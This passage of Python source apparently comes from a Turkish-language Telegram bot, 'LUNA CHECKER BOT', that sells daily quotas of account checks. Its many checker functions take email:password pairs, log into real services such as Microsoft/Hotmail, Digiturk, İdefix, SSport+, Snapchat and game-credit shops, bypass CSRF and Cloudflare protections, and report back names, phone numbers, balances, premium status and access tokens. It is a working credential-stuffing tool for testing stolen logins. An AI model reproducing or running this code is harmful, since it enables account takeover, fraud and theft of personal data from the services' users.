                         json={"email": email, "password": password}, headers=headers, timeout=15)
        if r.status_code == 200 and "accessToken" in r.text:
            data = r.json()
            token = data["accessToken"]
            h2 = headers.copy()
            h2["Authorization"] = f"Bearer {token}"
            r2 = requests.get("https://eu1.tabii.com/apigateway/auth/v2/me", headers=h2, timeout=10)
            if r2.status_code == 200:
                profile = r2.json()
                isim = profile.get("name", "-")
                premium = "✅ Premium" if "Premium" in str(profile.get("title", "")) else "❌ Free"
                return {"hit": True, "fields": {"Ad Soyad": isim, "Premium": premium}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_epinfy(email, password):
    """Epinfy Checker - API: epinfy.com"""
    session = requests.Session()
    session.headers.update({
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "origin": "https://epinfy.com", "referer": "https://epinfy.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest"
    })
    try:
        r = session.get("https://epinfy.com/client/kontrol-paneli", timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("meta", {"name": "csrf-token"})
        if csrf:
            session.headers.update({"X-CSRF-TOKEN": csrf["content"], "X-Requested-With": "XMLHttpRequest"})
        r2 = session.post("https://epinfy.com/client/login", data={"email": email, "password": password}, timeout=15)
        if "giris" not in r2.url.lower() or "kontrol-paneli" in r2.url.lower():
            r3 = session.get("https://epinfy.com/client/kontrol-paneli", timeout=10)
            name = extract_between(r3.text, 'kullaniciAdi">', '<') or email
            balance = extract_between(r3.text, 'bakiye">', '<') or "0 TL"
            phone = extract_between(r3.text, 'telefon">', '<') or "Yok"
            return {"hit": True, "fields": {"Ad Soyad": name, "Telefon": phone, "Bakiye": balance}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_s2gepin(email, password):
    """S2GEPIN Checker - API: api.s2gepin.com"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache", "Accept": "*/*"
    })
    try:
        r = session.post("https://api.s2gepin.com/Login/Customer", 
                        json={"email": email, "password": password, "otpcode": None, "CaptchaToken": "none"},
                        timeout=15)
        if "success\":true" in r.text and "Giriş Başarılı!" in r.text:
            token = extract_between(r.text, '"Token":"', '"')
            if token:
                r2 = session.get("https://www.s2gepin.com/", timeout=10)
                balance = extract_between(r2.text, 'class="text-dark fs-3 fw-bolder">', '<') or "0 TL"
                name = extract_between(r2.text, 'class="text-gray-800 text-hover-primary fs-6 fw-bolder">', '<') or email
                return {"hit": True, "fields": {"İsim": name, "Bakiye": balance}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_idefix(email, password):
    """İdefix Checker - API: fapi.idefix.com"""
    session_id = str(uuid.uuid4())
    headers = {
        "content-type": "application/json",
        "sessionid": session_id,
        "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "x-platform": "android"
    }
    try:
        r = requests.post("https://fapi.idefix.com/ecom/customer/login", 
                         json={"mail": email, "password": password}, headers=headers, timeout=15)
        if r.status_code == 200 and "token" in r.text:
            data = r.json()
            token = data["token"]
            headers["token"] = token
            r2 = requests.get("https://fapi.idefix.com/ecom/customer/account/info", headers=headers, timeout=10)
            if r2.status_code == 200:
                info = r2.json()
                isim = f"{info.get('firstName','')} {info.get('lastName','')}".strip() or email
                return {"hit": True, "fields": {"Ad Soyad": isim}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_ssport(email, password):
    """SSport+ Checker - API: api.ssportplus.com"""
    sngt = str(uuid.uuid4())
    tsid = int(time.time()) + random.randint(-300, 300)
    headers = {
        "Accept-Encoding": "gzip", "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "api.ssportplus.com", "SNGT": sngt,
        "UILanguage": "tr", "User-Agent": "Android_Mobile/2.31.26"
    }
    try:
        payload = {"action": "SubscriberLogin", "subscriber": {"LoginPreferedMethod": 0, "UILanguage": "tr", "Email": email, "PIN": password}, "Devices": [{"PlatformID": 10}], "TSID": tsid}
        r = requests.post("https://api.ssportplus.com/mw/SubscriberLogin", json=payload, headers=headers, timeout=15)
        if "SessionID" in r.text:
            data = r.json()
            sub = data.get("Subscriber", {})
            isim = f"{sub.get('FirstName','')} {sub.get('LastName','')}".strip() or email
            telefon = sub.get("PhoneNumber", "Yok")
            paket = sub.get("PackageName", "Free")
            yenileme = "✅" if sub.get("AutoRenew") else "❌"
            return {"hit": True, "fields": {"Ad Soyad": isim, "Telefon": telefon, "Paket": paket, "Yenileme": yenileme}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_smsonay(email, password):
    """SMSOnay Checker - API: smsonay.com"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.smsonay.com", "Referer": "https://www.smsonay.com/login"
    }
    try:
        r = session.post("https://www.smsonay.com/ajax/login", data={"email": email, "password": password}, headers=headers, timeout=15)
        if "Başarıyla giriş yaptınız" in r.text:
            r2 = session.get("https://www.smsonay.com/panel", headers=headers, timeout=10)
            name = extract_between(r2.text, 'class="fw-bolder d-flex align-items-center fs-5">', '<') or email
            balance = extract_between(r2.text, 'class="btn btn-success me-2">Bakiye: ', '<') or "0 TL"
            return {"hit": True, "fields": {"Ad Soyad": name, "Bakiye": balance}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_beitod(email, password):
    """BEIN x TOD Checker - API: digiturk.com.tr"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = session.get("https://onlineislemler.digiturk.com.tr/Account/Login", headers=headers, timeout=15)
        vt = extract_between(r.text, 'name="__RequestVerificationToken" type="hidden" value="', '"')
        if vt:
            r2 = session.post("https://onlineislemler.digiturk.com.tr/Account/Login",
                            data={"__RequestVerificationToken": vt, "Email": email, "Password": password},
                            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            if "Sisteme giriş yaptınız" in r2.text or "hesabim" in r2.url.lower():
                r3 = session.get("https://onlineislemler.digiturk.com.tr/Package/Packages/", headers=headers, timeout=10)
                paket_sayisi = r3.text.count('<div class="package-item">')
                ilk_paket = extract_between(r3.text, 'alt="', '"') or "Bilinmiyor"
                return {"hit": True, "fields": {"Paket Sayısı": str(paket_sayisi), "Paket": ilk_paket}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_medyabayim(email, password):
    """Medya Bayim Checker - API: medyabayim.com"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = session.get("https://medyabayim.com/", headers=headers, timeout=15)
        csrf = extract_between(r.text, 'name="_csrf" value="', '"')
        if not csrf:
            return {"hit": False}
        r2 = session.post("https://medyabayim.com/", 
                         data={"LoginForm[username]": email, "LoginForm[password]": password, "_csrf": csrf},
                         headers={**headers, "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://medyabayim.com"},
                         timeout=15)
        if "Yanlış kullanıcı adı veya şifre" in r2.text:
            return {"hit": False}
        if "Hoşgeldin" in r2.text or "logout" in r2.text.lower():
            balance = extract_between(r2.text, 'class="balance-dropdown__name.*?>', '<') or "0 TL"
            return {"hit": True, "fields": {"Bakiye": balance}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_ezglobal(email, password):
    """EZGlobal Checker - API: ezglobalyazilim.com"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache", "Accept": "*/*"
    })
    try:
        data = f"s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={email}&sifre={password}&ajtip=eval"
        r = session.post("https://www.ezglobalyazilim.com/ajax.php", data=data,
                        headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                "Origin": "https://www.ezglobalyazilim.com",
                                "Referer": "https://www.ezglobalyazilim.com/uyelik.html"}, timeout=15)
        if "Üye girişi başarılı" in r.text:
            r2 = session.get("https://www.ezglobalyazilim.com/hesabim.html", timeout=10)
            name = extract_between(r2.text, 'input id="gb_ad" type="text" value="', '"') or email
            return {"hit": True, "fields": {"Ad Soyad": name, "Bakiye": "Giriş Başarılı"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_oyundinar(email, password):
    """OyunDinar Checker - API: oyundinar.com"""
    try:
        scraper = cloudscraper.create_scraper()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
        }
        r = scraper.get("https://www.oyundinar.com/", headers=headers, timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"name": "_token"})
        if not token:
            return {"hit": False}
        token = token['value']
        data = {"_token": token, "email": email, "password": password}
        r2 = scraper.post("https://www.oyundinar.com/login", data=data, headers=headers, timeout=15)
        if "hesap" in r2.url.lower() or "panel" in r2.url.lower():
            balance = extract_between(r2.text, 'class="text-success">', '<') or "0 TL"
            return {"hit": True, "fields": {"Bakiye": balance, "Durum": "Premium"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_hotmail(email, password):
    """Hotmail Inboxer Checker - API: login.live.com"""
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    try:
        r = session.get("https://login.live.com/oauth20_authorize.srf?client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D&response_type=code&scope=profile+openid+offline_access+https://outlook.office.com/M365.Access", headers=headers, timeout=15)
        ppft = extract_between(r.text.replace('\\"', '"'), 'name="PPFT" id="i0327" value="', '"')
        url_post = extract_between(r.text.replace('\\"', '"'), 'urlPost":"', '"')
        if not ppft or not url_post:
            return {"hit": False}
        url_post = url_post.replace("\\/", "/")
        r2 = session.post(url_post, data=f"login={email}&passwd={password}&PPFT={ppft}&PPSX=PassportR", 
                         headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                         allow_redirects=False, timeout=15)
        if "Sign in to" in r2.text or r2.status_code != 302:
            return {"hit": False}
        loc = r2.headers.get("Location", "")
        if "code=" in loc:
            code = extract_between(loc, "code=", "&")
            if code:
                r3 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                 data={"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "code": code, "grant_type": "authorization_code",
                                       "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                                       "scope": "profile openid offline_access https://outlook.office.com/M365.Access"},
                                 headers=headers, timeout=15)
                if r3.status_code == 200 and "access_token" in r3.text:
                    access_token = r3.json().get("access_token", "")
                    return {"hit": True, "fields": {"Access Token": access_token[:30]+"...", "Durum": "✅ Giriş Başarılı"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_bkmkitap(email, password):
    """BKM Kitap Checker - API: bkmkitap.com"""
    session = requests.Session()
    headers = {
        "Host": "www.bkmkitap.com", "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.206",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.bkmkitap.com",
        "Referer": "https://www.bkmkitap.com/uye-girisi-sayfasi",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = session.post(f"https://www.bkmkitap.com/srv/customer/signin/email/{email}",
                        data={"password": password, "vendor": "0", "security": ""},
                        headers=headers, timeout=15)
        if "Başarıyla giriş yaptınız" in r.text:
            try:
                data = r.json()
                isim = f"{data.get('customer_first_name','')} {data.get('customer_last_name','')}".strip()
                return {"hit": True, "fields": {"Ad Soyad": isim or email, "Kayıt": data.get('customer_register_date','')}}
            except:
                return {"hit": True, "fields": {"Ad Soyad": email}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_snapchat(email, password):
    """Snapchat VM Checker - API: bitmoji.api.snapchat.com"""
    headers = {
        "origin": "https://www.bitmoji.com",
        "accept": "application/json, text/plain, */*",
        "cache-control": "no-cache", "pragma": "no-cache",
        "referer": "https://www.bitmoji.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4664.110 Safari/537.36"
    }
    try:
        r = requests.post("https://bitmoji.api.snapchat.com/api/user/find",
                         json={"email": email}, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            uid = data.get('user_id', 'N/A')
            return {"hit": True, "fields": {"User ID": uid, "Durum": "Hesap Bulundu"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_barlas(email, password):
    """Barlas Medya Checker - API: barlasmedya.com"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = session.get("https://barlasmedya.com/", headers=headers, timeout=15)
        csrf = extract_between(r.text, 'name="_token" value="', '"')
        if not csrf:
            return {"hit": False}
        r2 = session.post("https://barlasmedya.com/login",
                         data={"_token": csrf, "email": email, "password": password},
                         headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=15)
        if "panel" in r2.url.lower() or "dashboard" in r2.url.lower():
            name = extract_between(r2.text, 'class="username">', '<') or email
            return {"hit": True, "fields": {"Kullanıcı": name}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_supercell(email, password):
    """SuperCell Checker - API: odc.officeapps.live.com"""
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; Android 9; SM-G975N)",
        "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers=headers, timeout=15)
        if r.status_code == 200:
            return {"hit": True, "fields": {"SuperCell ID": email, "Durum": "Hesap Doğrulandı"}}
        return {"hit": False}
    except:
        return {"hit": False}

def checker_fenix(email, password):
    """Fenix Oyun Checker - API: fenixoyun.com"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache", "Accept": "*/*"
    })
    try:
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n--{boundary}--\r\n"
        r = session.post("https://fenixoyun.com/giris", data=body,
                        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                        allow_redirects=False, timeout=15)
        if r.status_code in [301, 302] and "hesap" in r.headers.get("Location", ""):
            r2 = session.get("https://fenixoyun.com/hesap", timeout=10)
            name = extract_between(r2.text, '<strong>', '</strong>') or email
            balance = extract_between(r2.text, 'Bakiye:', '<') or "0 TL"
            return {"hit": True, "fields": {"Ad Soyad": name, "Bakiye": balance}}
        return {"hit": False}
    except:
        return {"hit": False}

# ═══════════════════════════════════════════════════════════════════════
# CHECKER DAĞITICI
# ═══════════════════════════════════════════════════════════════════════

CHECKER_FUNCTIONS = {
    "1": checker_capcut, "2": checker_oyuncustore, "3": checker_exxen,
    "4": checker_tabii, "5": checker_epinfy, "6": checker_s2gepin,
    "7": checker_idefix, "8": checker_ssport, "9": checker_smsonay,
    "10": checker_beitod, "11": checker_medyabayim, "12": checker_ezglobal,
    "13": checker_oyundinar, "14": checker_hotmail, "15": checker_bkmkitap,
    "16": checker_snapchat, "17": checker_barlas, "18": checker_supercell,
    "19": checker_fenix
}

def run_single(email, password, checker_key):
    func = CHECKER_FUNCTIONS.get(checker_key)
    if not func:
        return {"hit": False}
    return func(email, password)


# BOT KURULUMU


bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")


# MENÜLER


def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("🔍 Checker'lar", callback_data="menu_checkers"),
        InlineKeyboardButton("👤 Profilim", callback_data="menu_profile"),
        InlineKeyboardButton("⭐ Premium", callback_data="menu_premium"),
        InlineKeyboardButton("📊 İstatistikler", callback_data="menu_stats"),
        InlineKeyboardButton("📢 Kanallarımız", callback_data="menu_channels"),
        InlineKeyboardButton("❓ Yardım", callback_data="menu_help"),
        InlineKeyboardButton("👑 @lunasloury👑", callback_data="{owner_name_luna}")
    ]
    markup.add(*buttons)
    return markup

def admin_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("⛔ Kullanıcı Banla", callback_data="admin_ban"),
        InlineKeyboardButton("✅ Ban Kaldır", callback_data="admin_unban"),
        InlineKeyboardButton("⭐ Premium Ver", callback_data="admin_prem_give"),
        InlineKeyboardButton("❌ Premium Geri Al", callback_data="admin_prem_rem"),
        InlineKeyboardButton("🔍 Kullanıcı Bul", callback_data="admin_find"),
        InlineKeyboardButton("📋 Kullanıcıları Listele", callback_data="admin_list"),
        InlineKeyboardButton("📊 İstatistikler", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Duyuru Yap", callback_data="admin_announce"),
        InlineKeyboardButton("🔑 Premium Kod Oluştur", callback_data="admin_mkcode"),
        InlineKeyboardButton("📜 Tüm Kodları Listele", callback_data="admin_codes"),
        InlineKeyboardButton("👥 Grup Premium Ver", callback_data="admin_gprem"),
        InlineKeyboardButton("🔙 Ana Menü", callback_data="back_main")
    ]
    markup.add(*buttons)
    return markup

def checkers_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, ch in CHECKERS.items():
        status = "✅" if ch["active"] else "❌"
        markup.add(InlineKeyboardButton(f"{ch['emoji']} {ch['name']} {status}", callback_data=f"ch_{key}"))
    markup.add(InlineKeyboardButton("🔙 Geri", callback_data="back_main"))
    return markup

# ═══════════════════════════════════════════════════════════════════════
# KOMUTLAR
# ═══════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def start_cmd(message):
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""
    lname = message.from_user.last_name or ""
    get_or_create_user(uid, uname, fname, lname)
    if is_banned(uid):
        bot.reply_to(message, "🚫 <b>Hesabınız engellenmiştir.</b>")
        return
    
    # ★ KANAL KONTROLÜ ★
    ok, ch = check_channels(uid)
    if not ok:
        txt = (f"🌙 <b>LUNA CHECKER BOT</b>\n\nBu botu kullanmak için kanallara katılmalısın:\n\n"
               f"📢 <b>@{CHANNEL_1}</b>\n📢 <b>@{CHANNEL_2}</b>\n\n"
               f"Katıldıktan sonra butona bas.")
        bot.reply_to(message, txt, reply_markup=channel_markup())
        return
    
    txt = (f"🌙 <b>LUNA CHECKER BOT</b>\n\nHoş geldin, <b>{fname}</b>! 👋\n\n"
           f"🔍 <b>19 Farklı Checker</b>\n"
           f"⭐ Günlük Hakkın: <b>{DAILY_LIMIT_PREMIUM if is_premium(uid) else DAILY_LIMIT_FREE}</b>\n"
           f"Apiyi octodan çaldım sakın söylemeyin\n"
           f"📊 Kalan: <b>{get_remaining(uid)}</b>\n\nAşağıdan seçim yap:")
    bot.reply_to(message, txt, reply_markup=main_menu())  
    
    

@bot.message_handler(commands=["admin"])
def admin_cmd(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Yetkiniz yok!")
        return
    bot.reply_to(message, "👑 <b>ADMIN PANELİ</b>", reply_markup=admin_menu())

@bot.message_handler(commands=["profile"])
def profile_cmd(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "🚫 Engellenmişsiniz.")
        return
    ud = get_or_create_user(uid)
    ps = "⭐ <b>PREMIUM</b>" if is_premium(uid) else "💫 <b>Ücretsiz</b>"
    pu = ud.get("premium_until", "—") if is_premium(uid) else "—"
    rem = get_remaining(uid)
    txt = (f"👤 <b>PROFİLİM</b>\n\n🆔 ID: <code>{uid}</code>\n👤 {ud.get('first_name','—')}\n"
           f"💎 {ps}\n⏳ Bitiş: {pu}\n📊 Toplam: <b>{ud.get('total_checks',0)}</b>\n"
           f"🎯 Kalan: <b>{rem}</b>\n📌 Limit: {'⭐ 7' if is_premium(uid) else '💫 2'}")
    bot.reply_to(message, txt)

@bot.message_handler(commands=["cancel"])
def cancel_cmd(message):
    bot.reply_to(message, "❌ İşlem iptal. /start ile ana menüye dön.")

@bot.message_handler(commands=["premium"])
def premium_cmd(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "🚫 Engellenmişsiniz.")
        return
    txt = "⭐ <b>PREMIUM ÜYELİK</b>\n\n"
    for d, p in PREMIUM_PRICES.items():
        txt += f"📌 <b>{d} Gün</b> — {p} TL\n"
    txt += f"\n🎁 Günlük <b>{DAILY_LIMIT_PREMIUM}</b> kontrol hakkı\n🔑 Kodun varsa direkt gönder."
    markup = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🔑 Kod Kullan", callback_data="prem_code_enter"),
        InlineKeyboardButton("🏠 Ana Menü", callback_data="back_main"))
    bot.reply_to(message, txt, reply_markup=markup)

# ═══════════════════════════════════════════════════════════════════════
# CALLBACK İŞLEYİCİ
# ═══════════════════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = call.from_user.id
    data = call.data

    if is_banned(uid) and not data.startswith("admin_"):
        bot.answer_callback_query(call.id, "🚫 Engellenmişsiniz.", show_alert=True)
        return
        
      # -- Kanal Kontrol Callback --
    if data == "check_channel":
        ok, ch = check_channels(uid)
        if ok:
            bot.answer_callback_query(call.id, "✅ Tüm kanallara üyesiniz!", show_alert=True)
            fname = call.from_user.first_name or ""
            txt = (f"🌙 <b>LUNA CHECKER BOT</b>\n\nHoş geldin, <b>{fname}</b>! 👋\n\n"
                   f"🔍 <b>19 Farklı Checker</b>\n⭐ Kalan Hakkın: <b>{get_remaining(uid)}</b>")
            bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=main_menu())
        else:
            bot.answer_callback_query(call.id, f"❌ {ch} kanalına katılmadınız!", show_alert=True)
        return  

    # -- Ana Menü Dönüş --
    if data == "back_main":
        fname = call.from_user.first_name or ""
        txt = (f"🌙 <b>LUNA CHECKER BOT</b>\n\nHoş geldin, <b>{fname}</b>! 👋\n\n"
               f"🔍 <b>19 Farklı Checker</b>\n⭐ Kalan Hakkın: <b>{get_remaining(uid)}</b>")
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=main_menu())

    # -- Checker'lar Menüsü --
    elif data == "menu_checkers":
        txt = "🔍 <b>CHECKER'LAR</b>\n\n"
        for key, ch in CHECKERS.items():
            st = "✅ Aktif" if ch["active"] else "❌ Pasif"
            txt += f"{ch['emoji']} <b>[{key}]</b> {ch['name']} — {st}\n"
        txt += f"\n📌 Kalan hakkın: <b>{get_remaining(uid)}</b>"
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=checkers_menu())

    # -- Profil --
    elif data == "menu_profile":
        ud = get_or_create_user(uid)
        ps = "⭐ PREMIUM" if is_premium(uid) else "💫 Ücretsiz"
        pu = ud.get("premium_until", "—") if is_premium(uid) else "—"
        txt = (f"👤 <b>PROFİLİM</b>\n\n🆔 ID: <code>{uid}</code>\n👤 {ud.get('first_name','—')}\n"
               f"💎 {ps}\n⏳ Bitiş: {pu}\n📊 Toplam: <b>{ud.get('total_checks',0)}</b>\n"
               f"🎯 Kalan: <b>{get_remaining(uid)}</b>\n📌 Limit: {'⭐ 7' if is_premium(uid) else '💫 2'}")
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Geri", callback_data="back_main"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    # -- Premium --
    elif data == "menu_premium":
        txt = "⭐ <b>PREMIUM ÜYELİK</b>\n\n"
        for d, p in PREMIUM_PRICES.items():
            txt += f"💰 <b>{d} Gün</b> — {p} TL\n"
        txt += f"\n🎁 Günlük {DAILY_LIMIT_PREMIUM} kontrol hakkı, Öncelikli destek, Tüm checker'lara tam erişim"
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🔑 Kod Kullan", callback_data="prem_code_enter"),
            InlineKeyboardButton("🏠 Ana Menü", callback_data="back_main"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup),
        
    
        

    elif data == "prem_code_enter":
        bot.edit_message_text("🔑 Premium kodunu gönder:", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, process_premium_code)

    # -- İstatistikler --
    elif data == "menu_stats":
        s = get_stats()
        txt = (f"📊 <b>BOT İSTATİSTİKLERİ</b>\n\n👥 Toplam: <b>{s['total_users']}</b>\n"
               f"⭐ Premium: <b>{s['total_premium']}</b>\n⛔ Engellenen: <b>{s['total_banned']}</b>\n"
               f"🔍 Toplam Kontrol: <b>{s['total_checks']:,}</b>\n📅 Bugün: <b>{s['today_checks']}</b>\n"
               f"👤 Aktif (Bugün): <b>{s['active_today']}</b>\n🔑 Kod: <b>{s['total_codes']}</b>")
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Geri", callback_data="back_main"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    # -- Kanallar --
    elif data == "menu_channels":
        txt = "📢 <b>KANALLARIMIZ</b>\n\n@glearya\n@luna_bot_destek"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Geri", callback_data="back_main"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    # -- Yardım --
    elif data == "menu_help":
        txt = (f"❓ <b>YARDIM</b>\n\n📌 /start — Botu başlat\n📌 /Profil -> Durumunu gör\n📌 /Checker'lar -> Kontrol yap\n"
               f"📌 /Premium -> Kod kullan\n\n📌 Limit: {'⭐ 7' if is_premium(uid) else '💫 2'} günlük\n"
               f"📌 İletişim: @lunasloury")
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Geri", callback_data="back_main"))
        bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

    # -- Checker Seç --
    elif data.startswith("ch_"):
        key = data.replace("ch_", "")
        if key not in CHECKERS:
            return
        ch = CHECKERS[key]
        if not ch["active"]:
            bot.answer_callback_query(call.id, "❌ Bu checker aktif değil!", show_alert=True)
            return
        rem = get_remaining(uid)
        if rem <= 0:
            txt = (f"❌ <b>Kontrol Hakkınız Doldu!</b>\n\nBugünlük limitin bitti.\n"
                   f"Ücretsiz: {DAILY_LIMIT_FREE} | Premium: {DAILY_LIMIT_PREMIUM}")
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("⭐ Premium Al", callback_data="menu_premium"),
                InlineKeyboardButton("🔙 Geri", callback_data="menu_checkers"))
            bot.edit_message_text(txt, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
            return
        txt = (f"{ch['emoji']} <b>{ch['name']} CHECKER</b>\n\n{ch['description']}\n\n"
               f"✅ Durum: Aktif\n📊 Kalan Hakkın: <b>{rem}</b>\n\n📌 Format: <code>email:şifre</code>\n"
               f"📌 .txt dosyası da gönderebilirsin.")
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"🎯 {ch['name']}'ı Başlat", callback_data=f"run_{key}"),
            InlineKeyboardButton("🔙 Checker'lar", callback_data="menu_checkers"))
